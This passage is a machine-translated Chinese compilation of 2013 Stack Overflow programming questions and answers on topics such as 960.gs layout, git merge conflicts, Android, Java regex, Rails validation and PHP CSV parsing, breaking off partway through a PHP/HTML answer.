> 标签：css, 960.gs

我有一个 960gs 的布局，但我不知道哪种方法是使用 960grid 系统居中此页面（ [http://andreapuiatti.de/screenshots/question.png ）内容的最佳方法。](http://andreapuiatti.de/screenshots/question.png)

设计师保证这个设计是基于 960gs 的，但是地狱......一切都超出了列！

我想出的唯一解决方案是使用 grid_12，然后添加我自己调整大小的自定义元素，但为什么要使用网格系统？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T11:35:28.520

确定图像和文本将跨越多少列，例如 12 列，并创建 12 列行作为父容器（全部在 960 网格框架内）。

在该行中，我将创建一个包装类（给它一个类），然后为图像（或其容器）应用一个标准的 CSS 规则，如`margin: 0 auto;`. `display: block`如果图像未包装在块级元素中，则应用于图像。

至于文本，`p`元素将填充包装元素，您可以根据需要调整边距。

通常，这些 CSS 网格框架会创建包含您的内容、文本和图像等的块级框。由设计者决定如何布置每个块中的元素。960.gs 和类似的 CSS 框架仅定义您的布局，而不是网格布局中每个框/块/面板中内容样式的详细信息。

**关于屏幕截图和设计器**
您的设计器可能不了解网格的工作原理，您需要与他/她讨论以指定图像边缘的位置。问题不在于 CSS 框架，而是设计规范需要更精确。没有错！

# android - 共享所有类型的文件时，内容提供程序中#getType() 和#getStreamTypes() 的实现应该是什么样子

> ID：15899262
> 
> 赞同：2
> 
> 时间：2013-04-09T10:16:12.813
> 
> 标签：android, mime-types, android-contentprovider

我有一个文件系统管理应用程序，我正在使用内容提供程序与外部 3rd 方应用程序共享所有类型的文件。

我的问题是：内容提供者中#getType() 和#getStreamTypes() 的实现应该是什么样的？

感谢所有的回复。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:37:33.987

请参阅ContentProvider 的[文档](http://developer.android.com/guide/topics/providers/content-provider-creating.html)

```
getType (Uri uri) 
```

实现它以处理给定 URI 处数据的 MIME 类型的请求。返回的 MIME 类型应该以 vnd.android.cursor.item 开头（对于单个记录）或 vnd.android.cursor.dir/ （对于多个项目）。

```
getStreamTypes (Uri uri, String mimeTypeFilter) 
```

由客户端调用以确定此内容提供程序支持给定 URI 的数据流类型。默认实现返回 null，表示没有类型。如果您的内容提供程序存储特定类型的数据，如果它与给定的 mimeTypeFilter 匹配，则返回该 MIME 类型。如果它可以执行类型转换，则返回与 mimeTypeFilter 匹配的所有受支持的 MIME 类型的数组。

# git - 在解决 git merge confilct 时合并这两个更改

> ID：15899263
> 
> 赞同：0
> 
> 时间：2013-04-09T10:16:13.237
> 
> 标签：git, git-merge

假设我们有 2 个开发分支（`master`和`feature`），并且两个分支都将一些代码添加到同一个文件中。当试图合并时，`feature`我们`master`遇到了一个单一的冲突：

```
++<<<<<<< HEAD
+ //some code added in master branch
++=======
+ //some code added in feature branch
++>>>>>>> feature 
```

如果我只想接受`HEAD`（主人）并放弃，`feature`我会运行：

```
git checkout --ours path/to/file 
```

如果我只想接受`feature`（主人）并放弃，`HEAD`我会运行：

```
git checkout --theirs path/to/file 
```

我怎样才能接受这两种更改，以便解决冲突的结果就像代码的简单联合？

```
//some code added in master branch
//some code added in feature branch 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:41:00.967

您将不得不手动编辑文件，并删除冲突标记（如果您只这样做，结果正是您想要的“联合”）。

Git 不会这样做，因为冲突解决是一个程序无法提供通用解决方案的语义问题。

尽管如果您经常或大规模执行此操作，您无疑可以为它编写一个脚本（尽管以自动化方式执行此操作可能会破坏您的代码）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T11:08:17.590

正如 Nevik 指出的那样，简单地删除标记将导致代码合并。这是我完成这项工作的 bash 脚本：

```
function git.both() {
  filename=$1
  tempfilename="temp_file_used_by_git_both"
  grep -v "<<<<<<<\|>>>>>>>\|=======" $filename > $tempfilename
  mv $tempfilename $filename

} 
```

用法：

```
git.both path/to/file 
```

# scala - 播放框架类型不匹配；找到：需要 Int：字符串

> ID：15899265
> 
> 赞同：1
> 
> 时间：2013-04-09T10:16:18.477
> 
> 标签：scala, playframework, compiler-errors, playframework-2.1

我是 Play 框架和 Scala 的初学者，我正在尝试在 Scala 上使用 Play 开发一个简单的 Web 项目，我正在使用 Eclipse IDE！

我的问题是，当我更改视图模板的参数时，尽管我在调用此视图的 Action 中传递了“相同的新”参数，但出现如下错误：

```
type mismatch; found : Int required: String 
```

为简化起见，假设我们有一个以参数为参数的视图，`@(value:String)`因此我可以从 Action 中调用此视图，`Ok(html.say(value))`例如 value 被声明为 String。

在这种情况下，一切都很好！

但是，当我将视图的参数更改为采用 Int`@(value:Int)`并从 Action 调用此视图时，`Ok(html.say(value))`尽管我将值的类型从 String 更改为 Int，但我得到：

```
Compilation error: type mismatch; found : Int required: String 
```

我对项目进行了清理，但没有帮助。问题是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T13:21:56.850

确保通过输入`compile`或重新加载页面（在运行应用程序时）从 Play 控制台进行编译。这将重新编译模板。然后您可以刷新 Eclipse 以使其接受更改。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-09T16:03:43.900

在发布有关 Play Framework 的任何问题之前，应运行“play clean compile”命令。它解决了 95% 的此类问题。

# database-design - 不确定我的数据库架构

> ID：15899266
> 
> 赞同：1
> 
> 时间：2013-04-09T10:16:20.427
> 
> 标签：database-design, foreign-keys, relational-database, primary-key, database-schema

我是数据库模式设计的新手，希望能得到一些建议。

我正在尝试编写一个小工具来管理基于 cisco 的网络设备的访问列表。我被困在如何对访问列表及其条目进行建模。这是一些信息；

访问列表具有以下属性

*   一个名称和 1 个或多个访问列表条目 (ACE)
*   访问列表条目（ACE）具有以下内容；
    *   源网络
    *   目标网络
    *   源端口
    *   目的端口
    *   协议
    *   一种行为 -

源网络和目标网络都可以是 -

*   直接引用其他对象组或网络的对象组。
*   网络。是 IP 地址和网络掩码的组合

源端口和目标端口都可以

*   直接引用其他对象组或 PORT 的对象组
*   A PORT - 是一个整数

对象组可以直接引用其他对象组或网络，即 IP 地址和网络掩码的组合。

还有一些更复杂的问题，但是我想将我的问题限制在上面突出显示的内容上。我附上了一张图表，展示了我认为我可以如何代表源网络作为示例。

非常感谢任何建议。

![在此处输入图像描述](https://i.stack.imgur.com/FRbay.png)

# iphone - 我是否必须添加不同的应用程序 ID 才能使用通用应用程序制作不同的应用程序？

> ID：15899268
> 
> 赞同：0
> 
> 时间：2013-04-09T10:16:22.503
> 
> 标签：iphone, ios, ios6, app-id

我有一个通用应用程序，通过在其中进行一些更改，我可以为不同的客户制作不同的应用程序。我有一个困惑，每次我在开发者资料中创建一个新应用程序时，我是否必须创建不同的应用程序 ID。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:20:08.447

每个不同的应用程序都需要自己的应用程序 ID。

但是，对于开发/调试，您可以创建一个由字符串组成的通配符应用程序 ID，`*`这将允许您为所有应用程序使用单个开发配置文件。

只有在分发时（通过应用商店或临时/企业），您才需要创建应用 ID 和配置文件。

# java - 使用 Swing 创建标签栏

> ID：15899269
> 
> 赞同：-2
> 
> 时间：2013-04-09T10:16:29.090
> 
> 标签：java, swing, look-and-feel

我想做这种外观和感觉

![在此处输入图像描述](https://i.stack.imgur.com/RA23g.jpg)

菜单上的按钮（仪表板、我的项目、目录）。有可能在摇摆时做到这一点吗？或者那是什么样的组件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:24:58.427

它看起来像[JTabbedPane](http://docs.oracle.com/javase/tutorial/uiswing/components/tabbedpane.html)：

![](https://i.stack.imgur.com/w9GFa.png)

这是一个关于自定义 Swing 组件的[教程](http://today.java.net/pub/a/today/2007/02/22/how-to-write-custom-swing-component.html)和一个[SO 问题。](https://stackoverflow.com/questions/822899/how-to-create-a-custom-swing-component)

# algorithm - 为图中的每个节点计算距离 n 处未访问的节点

> ID：15899270
> 
> 赞同：7
> 
> 时间：2013-04-09T10:16:30.487
> 
> 标签：algorithm, graph, shortest-path, breadth-first-search

对于大图中的每个点，我正在尝试创建一个列表，其中包含距`n`起始节点一定距离的未访问节点的数量。一个示例输出是： `[1,3,6]` 这意味着在距离 0 处有起始节点本身，在距离 1 处有 3 个新的（未探索的）节点，等等。

如果您只有一个起点，这相当容易：您只需在广度优先搜索的基础上增加一个 shell 计数器。当我必须对图中的每个节点执行此操作时，问题就开始了。因为我的图很大（> 100000 个节点），所以对每个点执行上述例程变得相当慢。

我的第一次优化尝试是检查 node 处的列表`a`是否可以从 的所有邻居的列表中构建`a`，但到目前为止我没有运气，部分原因是图中的循环。我希望你们中的一些人可能有一些不错的想法，也许涉及一些我可以缓存的额外信息。

我的问题：如果你知道你必须为**每个**节点都做这种搜索，有没有办法优化这种搜索？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-05-05T22:45:39.553

在 less than 中似乎不太可能有解决方案`O(n*|V|^2)`，所以这里有一个 Python 中的方法，看起来并不太糟糕。

```
# some basic topologies
def lineE(N): 
  return(set((i,i+1) for i in range(N-1)))

def ringE(N):
  return(lineE(N).union([(0,N-1)]))

def fullE(N):
  return(set([(i,j) for i in range(N) for j in range(i)]))

# propagate visitors from x to y
def propagate(V, curr, x, y, d):
  nexty = set()
  for cx in curr[x]:
    if not cx in V[y]["seen"]:
      V[y]["seen"].add(cx)
      V[y]["foaf"][d] = V[y]["foaf"].get(d,0) + 1
      nexty.add(cx)
  return(nexty)

# run for D iterations
def mingle(N, E, D):
  V = dict((i, {"seen":set([i]), "foaf":{0:1}}) for i in range(N))
  curr = dict((i, set([i])) for i in range(N))
  for d in range(1, min(D+1, N)):
    next = dict((i, set()) for i in range(N))
    for (h, t) in E:
      next[t] = next[t].union(propagate(V, curr, h, t, d))
      next[h] = next[h].union(propagate(V, curr, t, h, d))
    curr = next
  return(V) 
```

用 10 个节点和距离 3 进行尝试，

```
N=10
D=3
for (topology, E) in [("line", lineE(N)), ("ring", ringE(N)), ("full", fullE(N))]:
  V = mingle(N, E, D)
  print "\n", topology
  for v in V:
    print v, V[v]["foaf"] 
```

我们得到

```
line
0 {0: 1, 1: 1, 2: 1, 3: 1}
1 {0: 1, 1: 2, 2: 1, 3: 1}
2 {0: 1, 1: 2, 2: 2, 3: 1}
3 {0: 1, 1: 2, 2: 2, 3: 2}
4 {0: 1, 1: 2, 2: 2, 3: 2}
5 {0: 1, 1: 2, 2: 2, 3: 2}
6 {0: 1, 1: 2, 2: 2, 3: 2}
7 {0: 1, 1: 2, 2: 2, 3: 1}
8 {0: 1, 1: 2, 2: 1, 3: 1}
9 {0: 1, 1: 1, 2: 1, 3: 1}

ring
0 {0: 1, 1: 2, 2: 2, 3: 2}
1 {0: 1, 1: 2, 2: 2, 3: 2}
2 {0: 1, 1: 2, 2: 2, 3: 2}
3 {0: 1, 1: 2, 2: 2, 3: 2}
4 {0: 1, 1: 2, 2: 2, 3: 2}
5 {0: 1, 1: 2, 2: 2, 3: 2}
6 {0: 1, 1: 2, 2: 2, 3: 2}
7 {0: 1, 1: 2, 2: 2, 3: 2}
8 {0: 1, 1: 2, 2: 2, 3: 2}
9 {0: 1, 1: 2, 2: 2, 3: 2}

full
0 {0: 1, 1: 9}
1 {0: 1, 1: 9}
2 {0: 1, 1: 9}
3 {0: 1, 1: 9}
4 {0: 1, 1: 9}
5 {0: 1, 1: 9}
6 {0: 1, 1: 9}
7 {0: 1, 1: 9}
8 {0: 1, 1: 9}
9 {0: 1, 1: 9} 
```

这似乎是正确的。此外，在我的笔记本电脑上运行具有 100000 个节点的距离为 100 的简单拓扑大约需要一分钟。当然，如果你有一个密集的图表（如`fullE`），这会爆炸。

```
N=100000
D=100
for (topology, E) in [("line", lineE(N)), ("ring", ringE(N))]:
  V = mingle(N, E, D) 
```

# java - 字符串仅替换连续空格

> ID：15899274
> 
> 赞同：3
> 
> 时间：2013-04-09T10:16:38.607
> 
> 标签：java, regex

我有这样的字符串：

```
test    text test 
```

我想保持单个空格原样并用替换多个空格`&nbsp;`
所以它将变成：

```
tets&nbsp;&nbsp;&nbsp;&nbsp;text test 
```

这里有人可以建议我`regex`吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-09T10:32:00.863

您可以使用以下替换：

```
String replaced = str.replaceAll("((?<= ) | (?= ))", "&nbsp;"); 
```

### 现场演示：http: [//ideone.com/kNb7rd](http://ideone.com/kNb7rd)

**说明：**我在这里使用正则表达式的前瞻和后视功能。`((?<= ) | (?= ))`意味着找到一个空格，它**前面有一个空格`(?<= )`**或**后面有一个空格`(?= )`**这将确保单个空格不被替换，但所有多个空格都被替换。有关环视的更多详细信息，请参阅此链接：[http ://www.regular-expressions.info/lookaround.html](http://www.regular-expressions.info/lookaround.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:22:03.057

像下面这样尝试它会帮助你..

它替换`Multiple spaces`为`Single Space`..

```
YourString.trim().replaceAll(" +", " "); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T10:39:57.603

```
String str = "test    text test ";
System.out.println(str.replaceAll("\\s+", " ")); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-09T10:54:28.537

```
String str="test     text test";
str=str.replaceAll("\\s\\s","&nbsp;&nbsp;");
str=str.replaceAll("&nbsp;\\s","&nbsp;&nbsp;");//It will work for Odd number 
```

如果有奇数个空格，第一个替换将留下一个空格，因此第二个替换可以解决该问题。

# vim - tmux：C-PageUp 和 C-PageDown 似乎不起作用

> ID：15899276
> 
> 赞同：7
> 
> 时间：2013-04-09T10:16:42.723
> 
> 标签：vim, tmux

导航到上一个/下一个选项卡的默认 VIM 键序列分别是 C-PageUp 和 C-PageDown。看来这些序列在 tmux 1.5 或 1.6 下都不起作用，我在 Centos 和 Ubuntu 下都试过了。我尝试在我的 .tmux.conf 中取消绑定序列，但这没有任何效果。

很容易重新创建：

1.  启动 tmux 会话
2.  vim xxx.dat
3.  :tabnew yyy.dat
4.  尝试使用 C-PageUp/C-PageDown 交替选项卡。纳达。

在 tmux 之外重复步骤 2-4，选项卡切换将正常工作。

# google-chrome - 有没有办法对 .pem 文件进行密码保护，以便在将扩展名添加到 Google Chrome 之前提示您输入密码？

> ID：15899278
> 
> 赞同：0
> 
> 时间：2013-04-09T10:16:52.607
> 
> 标签：google-chrome, pem

我创建了一个基本的 Chrome 扩展程序，它生成了一个 key.pem 文件。

是否有密码保护 key.pem 文件，所以每次我想在 Google Chrome 上安装此扩展时都会收到提示？

我尝试过使用以下内容；我在其中输入用于保护文件的密码，但是当我尝试打包此扩展程序时，它显示“无效的私钥”

openssl genrsa -des3 -out key.pem 2048

任何帮助表示赞赏。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:38:11.783

这个线程有帮助吗？

[http://productforums.google.com/d/msg/chrome/bKoAAPX4iVA/aXZ_Cy0TJ3kJ](http://productforums.google.com/d/msg/chrome/bKoAAPX4iVA/aXZ_Cy0TJ3kJ)

我不确定这是否仍然适用于最新的 Chrome，但它是在 2012 年 10 月发布的，所以它可能会。

希望这可以帮助 ：）

*编辑：对不起，如果这完全不是你所希望的:)*

# ruby-on-rails - 如何在 Rails 中创建关联之前设置自定义验证

> ID：15899280
> 
> 赞同：0
> 
> 时间：2013-04-09T10:16:54.437
> 
> 标签：ruby-on-rails, ruby-on-rails-3

不确定这个问题是否有意义，所以我将通过一个例子来描述：

基本上我的应用程序中有一个公司模型和一个公司员工。员工是一个设计模型，可以注册/登录。我为员工设置了一个向导，以便在注册后选择他们工作的公司，因此该模型接受公司的嵌套属性。

在他们选择他们工作的公司的阶段，我想设置一个验证，以确保他们只选择他们工作的公司，方法是将员工的电子邮件域与我的数据库中公司的电子邮件域进行匹配。我应该在什么时候这样做？我应该设置自定义验证器还是使用回调？

这是我的代码：

员工：

```
class Employee < ActiveRecord::Base

  ##################
  # Base
  ###################

  rolify
  # Include default devise modules. Others available are:
  # :token_authenticatable, :confirmable,
  # :lockable, :timeoutable and :omniauthable
  devise :database_authenticatable, :registerable,
         :recoverable, :rememberable, :trackable, :validatable, :confirmable, :omniauthable

  # Setup accessible (or protected) attributes for your model
  attr_accessible :name, :email, :password, :password_confirmation, :remember_me, :company_id, :company_attributes

  ##################
  # Associations
  ###################

  belongs_to :company
  accepts_nested_attributes_for :company
  has_many :authentications, dependent: :destroy

end 
```

公司：

```
class Company < ActiveRecord::Base

  ##################
  # Base
  ###################

  attr_accessible :name, :address_attributes, :email, :phone_number, :website, :confirmed

  ##################
  # Associations
  ###################

  has_one :address
  accepts_nested_attributes_for :address
  has_many :employees

end 
```

这是负责员工选择公司的控制器，它是一个邪恶的宝石向导控制器。

```
class EmployeeStepsController < ApplicationController
  before_filter :authenticate_employee!
  include Wicked::Wizard
  steps :personal, :company_details, :enter_company_details

  def show
    @employee = current_employee
    case step
    when :enter_company_details
      if @employee.company
        skip_step
      else
        @employee.build_company.build_address
      end
    end
    render_wizard
  end

  def update
    @employee = current_employee
    @employee.attributes = params[:employee]
    render_wizard @employee
  end

  private

  def finish_wizard_path
    employee_url(@employee)
  end

end 
```

我有另一个控制器，它为站点管理员分别处理将公司添加到站点中，但我只想在员工选择他们的公司时触发向导控制器中的电子邮件验证。对此有何建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:39:28.893

```
class Employee < ActiveRecord::Base

  ##################
  # Base
  ###################

  rolify
  # Include default devise modules. Others available are:
  # :token_authenticatable, :confirmable,
  # :lockable, :timeoutable and :omniauthable
  devise :database_authenticatable, :registerable,
         :recoverable, :rememberable, :trackable, :validatable, :confirmable, :omniauthable

  # Setup accessible (or protected) attributes for your model
  attr_accessible :name, :email, :password, :password_confirmation, :remember_me, :company_id, :company_attributes

  ##################
  # Associations
  ###################

  belongs_to :company
  accepts_nested_attributes_for :company
  has_many :authentications, dependent: :destroy

  # HERE
  validate :my_custom_vaildator

  private
    def my_custom_vaildator
      # do stuff .....
      # based off that stuff add errors
      if some_logic_about_your_company?
          self.errors.add(:base, "select the company you work for.")
      elsif some_other_logic?
          self.errors.add(:name, "your name sucks.")
      end
    end  
end 
```

记住：

永远不要返回 nil 或 false。如果你这样做，它会爆炸！

=)

所有这一切都表明前端永远不应该允许他们选择不允许的东西。

# java - 了解 java rmi 的良好实践

> ID：15899281
> 
> 赞同：1
> 
> 时间：2013-04-09T10:16:56.337
> 
> 标签：java, rmi

我有一个 RMI 应用程序，基本上来自客户端的每个请求都创建了一个到数据库的新连接（在服务器端），运行 SQL 查询并将数据转换为可序列化的类，然后发送回客户端。

该应用程序的用户群不断增长，请求需要很长时间才能完成。以前的程序员提出的解决方案是创建一个从服务器到数据库的固定大小的连接池，每个客户端的请求都使用最旧的（最近最少使用的）来运行 SQL 查询。我的问题是：解决此类问题的正确方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T10:38:15.253

我想说，汇集数据库连接已经是一个重要的步骤，因为建立一个连接是昂贵的。但是，我不会使用我自己的池，而是使用现有且经过验证的池化数据源实现，例如 DBCP 或 C3P0。它们具有许多有用的功能，例如不同的大小、自动连接检查等...

如果是查询本身占用的时间太长，那么优化会比这更复杂。各种方法都是可能的，具体取决于情况的细节，例如：

*   正如您的问题似乎暗示的那样，是否只有一个 SQL 查询，总是相同的？
*   数据库是只读的吗？
*   如果没有，修改是在同一个应用程序内进行还是在外部进行？
*   ETC...

减少请求时间的可能方法（我现在能想到的）：

*   在 java 应用程序中缓存结果（但这是一个庞大的主题......）
*   SQL请求的优化
*   优化数据库架构，使用索引或更深入地重构表结构
*   将发送回客户端的数据量减少到最低限度（以防网络成为瓶颈）

我希望这有帮助。我们确实需要有关用例的更多详细信息，以便为您提供更好的答案。

# node.js - 复合js应用程序的npm测试

> ID：15899282
> 
> 赞同：0
> 
> 时间：2013-04-09T10:16:56.397
> 
> 标签：node.js, npm, mocha.js, nodeunit, compoundjs

我有一个复合 js 应用程序。我只使用生成脚手架

复合g脚手架用户名姓

该命令还创建了 test/controllers/users-controllers-test.js 文件。我曾尝试将此测试作为“npm 测试”运行。

但在 Windows 上，它给出的错误是“ `Error: ENOENT, stat '.........\test\*\*`'

在 linux/centos 上，它给出了一个类似“ReferenceError: describe is not defined”的错误

请帮助我了解我到底错过了什么......

请尽快提出要求，因为它阻碍了我的工作。

在此先感谢，等待肯定的答案，

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-10T19:16:16.023

请参阅[https://stackoverflow.com/a/16639709/448876](https://stackoverflow.com/a/16639709/448876)。

您应该使用`mocha test/*`而不是`npm test`.

首先确保安装了 mocha：

```
npm install -g mocha 
```

# android - 更改选项卡后软键盘仍然可见

> ID：15899284
> 
> 赞同：1
> 
> 时间：2013-04-09T10:17:00.780
> 
> 标签：android

我的主屏幕上有四个选项卡，其中一个接受用户输入。在输入选项卡中输入数据时，键盘打开。当我切换到其他选项卡时，此键盘保持打开状态。关于我需要做什么的任何建议？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:24:48.500

以下代码复制自[Close/hide the Android Soft Keyboard](https://stackoverflow.com/questions/1109022/close-hide-the-android-soft-keyboard)。

下次发问题前请先搜索论坛：

```
tabHost.setOnTabChangedListener(new OnTabChangeListener()
        {
        public void onTabChanged(String tabId)
            {
            InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
            imm.hideSoftInputFromWindow(tabHost.getApplicationWindowToken(), 0);
            }
        } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:33:17.297

这可以帮助你，在`Manifest`你`Activity` `declaire`这样

```
<activity android:windowSoftInputMode="adjustResize" /> 
```

或者

```
<activity android:windowSoftInputMode="adjustPan" /> for more info 
```

[看这里](http://developer.android.com/guide/topics/manifest/activity-element.html#wsoft)

或者

```
<activity
        android:name=".Home"
        android:configChanges="keyboardHidden|orientation">
    </activity> 
```

# android - ANDEngine : 动态缩放玩家精灵

> ID：15899288
> 
> 赞同：0
> 
> 时间：2013-04-09T10:17:13.510
> 
> 标签：android, svg, andengine

我在 ANDEngine GLES 2.0 中开发游戏。我打算在游戏过程中根据某些用户输入动态地放大和缩小我的玩家（对象）。

我有矢量图（SVG）和位图（PNG）两种格式的播放器。使用 BitmapTexture 将图形转换为位图，因此对象在放大时会变形。

ANDEngine 中实现这一目标的最佳方法是什么，即避免放大失真

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-09T18:02:23.857

选项1：

使您的播放器纹理尺寸最大，并按比例缩小。下采样往往看起来比上采样更好。

选项 2：

以多种分辨率渲染纹理，使用合适的分辨率。这方面的一个例子是经典超级马里奥兄弟中蘑菇的效果。当他收集蘑菇时，16 像素马里奥被换成了 32 像素马里奥。

# c# - Childwindow WPF扩展工具包未打开

> ID：15899289
> 
> 赞同：0
> 
> 时间：2013-04-09T10:17:14.163
> 
> 标签：c#, .net, wpf, wpf-4.0

这是我打开子窗口的代码：

```
 ImageLocation location = new ImageLocation();            
            location.WindowStartupLocation = Xceed.Wpf.Toolkit.WindowStartupLocation.Center;

            location.Show(); 
```

但是子窗口根本不显示。

这是我的子窗口 xaml：

```
<xctk:ChildWindow x:Class="CXLocalSearch.Dialogs.ImageLocation"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" Caption="Image Path"
                  xmlns:xctk="http://schemas.xceed.com/wpf/xaml/toolkit"
       Height="64" Width="400">
    <Grid x:Name="LayoutRoot">
        <Grid.ColumnDefinitions>
            <ColumnDefinition Width="Auto" MinWidth="63.95"/>
            <ColumnDefinition/>
        </Grid.ColumnDefinitions>
        <Grid.RowDefinitions>
            <RowDefinition Height="Auto" />
            <RowDefinition/>
        </Grid.RowDefinitions>
        <TextBlock Margin="2" TextWrapping="Wrap" Text="Image Path"  VerticalAlignment="Center" HorizontalAlignment="Left"/>
        <StackPanel Grid.Column="1" HorizontalAlignment="Left" Margin="3,2,0,2" Orientation="Horizontal" >
            <TextBox x:Name="txtPath" Margin="0,2" TextWrapping="Wrap" VerticalAlignment="Center" Width="250"/>
            <Button x:Name="btnSave" Content="Save" Click="btnSave_Click"  Width="60" Margin="3,0,0,0"/>
        </StackPanel>
    </Grid>
</xctk:ChildWindow> 
```

有人可以澄清问题是什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T11:01:34.790

从外观上看，您已将您的控件分离`ChildWindow`到一个单独的控件中。这很好，但它需要托管在主窗口中才能变得可见。从最简单的事情开始：

```
<Window>
    <Grid>
        <Button Click="...">Click to Show</Button>
        <xctk:ChildWindow x:Name="childWindow">
            <TextBlock>Hello!</TextBlock>
        </xctk:ChildWindow>
    </Grid>
</Window> 
```

我想你会发现这很好用（假设事件连接），所以从那里开始。

# java - 如何在android中下载页面

> ID：15899290
> 
> 赞同：2
> 
> 时间：2013-04-09T10:17:14.563
> 
> 标签：java, android, search, webpage

我正在开发一个 android 应用程序，该应用程序必须下载一个网页..对于代码的编写方式。如果有人知道请帮忙。

我需要在 webview 中下载和查看的页面是 [这个](http://www.androidaspect.com/)

我参考这个[问题](https://stackoverflow.com/questions/3028306/download-a-file-with-android-and-showing-the-progress-in-a-progressdialog)来实现我的目标。但我没有得到正确的答案...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T11:04:51.153

您可以使用此示例代码下载 html 源代码。

```
 public void getHtml() throws ClientProtocolException, IOException
 {
    HttpClient httpClient = new DefaultHttpClient();
    HttpContext localContext = new BasicHttpContext();
    HttpGet httpGet = new HttpGet("http://www.androidaspect.com/");
    HttpResponse response = httpClient.execute(httpGet, localContext);
    String result = "";

    BufferedReader reader = new BufferedReader(
        new InputStreamReader(
          response.getEntity().getContent()
        )
      );

    String line = null;
    while ((line = reader.readLine()) != null){
      result += line + "\n";

    }

 } 
```

请务必将它与 AsyncTask 一起使用，而不是在主线程上使用。不要忘记

```
<uses-permission android:name="android.permission.INTERNET"> 
```

允许。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T10:27:04.937

您可以使用口袋：

[点击这里。](http://getpocket.com/)

以下内容可能会有所帮助。
[如何下载网页以在 Nexus 7 上离线查看](https://stackoverflow.com/questions/12322978/how-to-download-a-webpage-for-offline-viewing-on-nexus-7)

# django - Django REST 框架非模型序列化器和 BooleanField

> ID：15899296
> 
> 赞同：2
> 
> 时间：2013-04-09T10:17:32.910
> 
> 标签：django, django-rest-framework

在尝试处理以下用例时，我似乎遇到了充满令人费解的结果：

```
URL: '^api/event/(?P<pk>[0-9]+)/registration$'
payload: {"registered": "true"} or {"registered": "false"} 
```

我检索与给定pk对应的事件对象，然后基于我想要的：

*   在 GET 请求中检索经过身份验证的用户是否已注册
*   在 PUT 中更改注册状态。

一切正常，直到我想处理 PUT 请求中的传入有效负载。我尝试过创建这样的序列化程序：

```
class RegistrationSerializer(serializers.Serializer):
    registered = fields.BooleanField() 
```

并从 APIView 的 put 方法调用它：

```
serializer = RegistrationSerializer(data=request.DATA) 
```

但它不起作用并且`serializer.data`总是包含 `{"registered": False}

从外壳我尝试了另一个孤立的测试：

```
>>> rs = RegistrationSerializer(data={'registered':True})
>>> rs
<app.serializers.RegistrationSerializer object at 0x10a08cc10>
>>> rs.data
{'registered': False} 
```

我究竟做错了什么？处理此用例的最佳方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T11:01:23.260

您需要先调用`rs.is_valid()`，然后才能访问`rs.data`.

如果您不这样做，框架确实应该引发异常。

# php - 对 CSV 数据进行火查询

> ID：15899301
> 
> 赞同：2
> 
> 时间：2013-04-09T10:17:56.430
> 
> 标签：php

我有一个公共的 google 电子表格`CSV`。我从远程 URL 获取数据作为数组。然后我将信息显示为 HTML 列表，引用适当的数组项。现在我想在它上面触发一个 php 选择查询，以便只显示特定演员的八卦。怎么做？（我想使用一个变量 $Name.wen 我提供了 Name。我应该得到那个 Actor 的八卦。）

我的 excel 表包含以下列

```
> 1.Sr No.
> 2.Name
> 3.Gossip 
```

这是我的 php 页面的代码，它以列表的形式检索数据：

```
$lines = file('https://docs.google.com/spreadsheet/pub?key=0AgzUC4MxdChJdFIyMHFUZ21PS053b3Z1OHFnbHJwYVE&single=true&gid=0&output=csv');

$headers = array_shift($lines);

foreach ($lines as $line)
{

    $ldata =  explode(',', trim($line)); 

    if ($ldata[0] == '') break;
    echo '<li>Sr No.  <strong>' . $ldata[0] . '</strong></li><li>Name  <strong>' . $ldata[1] . '</strong></li><li>Gossip <strong>' . $ldata[2] . '</strong></li>';
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T11:12:15.963

试一试：

```
<?php    
   // get the CSV data as an array from the remote URL
define('GOOGLE_DOC','https://docs.google.com/spreadsheet/pub?key=0AgzUC4MxdChJdFIyMHFUZ21PS053b3Z1OHFnbHJwYVE&single=true&gid=0&output=csv');

if(isset($_GET['filterColumn'])){define('FILTER_COLUMN',$_GET['filterColumn']);}
if(isset($_GET['filterValue'])){define('FILTER_VALUE',$_GET['filterValue']);}

function readCSVIntoArray($fileName)
{
    $rows=array();
    if (($handle = fopen($fileName, "r")) !== FALSE)
    {
        while (($data = fgetcsv($handle, 1000, ",")) !== FALSE){$rows[]=$data;}
        fclose($handle);
    }
    $h=array_shift($rows);
    return array($h,$rows);
}

list($head,$rows)=readCSVIntoArray(GOOGLE_DOC);
header('Content-Type: text/html; charset=utf-8');
?><!doctype html>
<html>
<head>
<meta charset="utf-8" />
<title>Ultimater's Example</title>
<style type="text/css">
html,body
{
    margin:0;
    padding:0;
    font-family:'Source Sans Pro',sans-serif;
    font-size: 13px;
    color:black;
    background:#e2e2ec;
    line-height:15px;
}
table{border-collapse:collapse;}
